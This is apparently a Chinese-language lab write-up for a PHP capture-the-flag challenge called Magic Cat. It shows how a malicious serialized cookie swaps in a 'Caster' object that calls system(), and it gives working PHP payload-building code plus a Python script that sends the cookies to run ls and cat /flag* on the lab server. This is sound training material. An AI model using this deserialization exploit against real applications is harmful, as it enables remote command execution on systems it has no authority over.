# lab_Magic_Cat

1. 這題打開來後，他提示 /?source 可以看到 Source Code，然後要求我們要在 /?spell= 之後拼出 cat ，我先連進網站，大致上看了一下程式碼，比較重要的是這邊，如果網址中有 'spell' 參數，則建立一個新的 Cat 物件，並將值給 $cat 變數，網址中沒有 'spell' 參數，但 cookie 中有 'cat'，則顯示 "Unserialize...\n"，並將 cookie 中的值反序列化（base64_decode、unserialize）後儲存在變數 $cat 中，如果網址中也沒有 'spell' 參數，且 cookie 中也沒有 'cat'，則建立一個新的 Cat 物件，並將 "meow-meow-magic" 賦值給 $cat 變數。然後它會在 This is your cat 後面執行 var_dump($cat)。
    
    ![截圖 2023-01-05 上午11.16.24.png](lab_Magic_Cat%200ff7330359604ba9b2ab8074519dbad4/%25E6%2588%25AA%25E5%259C%2596_2023-01-05_%25E4%25B8%258A%25E5%258D%258811.16.24.png)
    
    ![截圖 2023-01-05 上午11.18.26.png](lab_Magic_Cat%200ff7330359604ba9b2ab8074519dbad4/%25E6%2588%25AA%25E5%259C%2596_2023-01-05_%25E4%25B8%258A%25E5%258D%258811.18.26.png)
    
2. 然後我們只需要將 cookie 控為我們要的內容，就會跟上一題一樣把值給 $cat，讓它執行 $cat。
    
    ![截圖 2023-01-05 上午11.15.20.png](lab_Magic_Cat%200ff7330359604ba9b2ab8074519dbad4/%25E6%2588%25AA%25E5%259C%2596_2023-01-05_%25E4%25B8%258A%25E5%258D%258811.15.20.png)
    

1. 最後我們用跟差 lab_Baby_Cat 差不得多方式，將$Cat 序列化之後，在把值設為 Cookie ，並對網站出 Request ，就可以成功執行我們的指令，然後會發現根目錄有個 flag_5fb2acebf1d0c558 檔案，用 Cat 將他打開後就可以成功取得 FLAG。

```php
<?php

class Magic
{
    function cast($spell)
    {
        echo "<script>alert('MAGIC, $spell!');</script>";
    }
}

// Useless class?
class Caster
{
    public $cast_func = 'system';
    function cast($val)
    {
        return ($this->cast_func)($val);
    }
}

class Cat
{
    public $magic;
    public $spell;
    function __construct($spell)
    {
        $this->magic = new Magic();
        $this->spell = $spell;
    }
    function __wakeup()
    {
        echo "Cat Wakeup!\n";
        $this->magic->cast($this->spell);
    }
}
#$cat = new Cat("ls");
#$cat = new Cat("ls /");
$cat = new Cat("cat /flag*");
$cat->magic = new Caster();
var_dump($cat);
echo base64_encode(serialize($cat));

?>
```

```python
import requests

# $(ls)
#cookies={"cat": "TzozOiJDYXQiOjI6e3M6NToibWFnaWMiO086NjoiQ2FzdGVyIjoxOntzOjk6ImNhc3RfZnVuYyI7czo2OiJzeXN0ZW0iO31zOjU6InNwZWxsIjtzOjI6ImxzIjt9"}
# $(ls /)
#cookies={"cat": "TzozOiJDYXQiOjI6e3M6NToibWFnaWMiO086NjoiQ2FzdGVyIjoxOntzOjk6ImNhc3RfZnVuYyI7czo2OiJzeXN0ZW0iO31zOjU6InNwZWxsIjtzOjQ6ImxzIC8iO30="}
# $(cat /flag_5fb2acebf1d0c558)
cookies={"cat": "TzozOiJDYXQiOjI6e3M6NToibWFnaWMiO086NjoiQ2FzdGVyIjoxOntzOjk6ImNhc3RfZnVuYyI7czo2OiJzeXN0ZW0iO31zOjU6InNwZWxsIjtzOjEwOiJjYXQgL2ZsYWcqIjt9"}

r = requests.get("http://h4ck3r.quest:8602", cookies=cookies)
#print(r.content)
string = r.content.split(b'\n')
[print(string[i]) for i in range(len(string))]
```

![截圖 2023-01-05 上午11.38.47.png](lab_Magic_Cat%200ff7330359604ba9b2ab8074519dbad4/%25E6%2588%25AA%25E5%259C%2596_2023-01-05_%25E4%25B8%258A%25E5%258D%258811.38.47.png)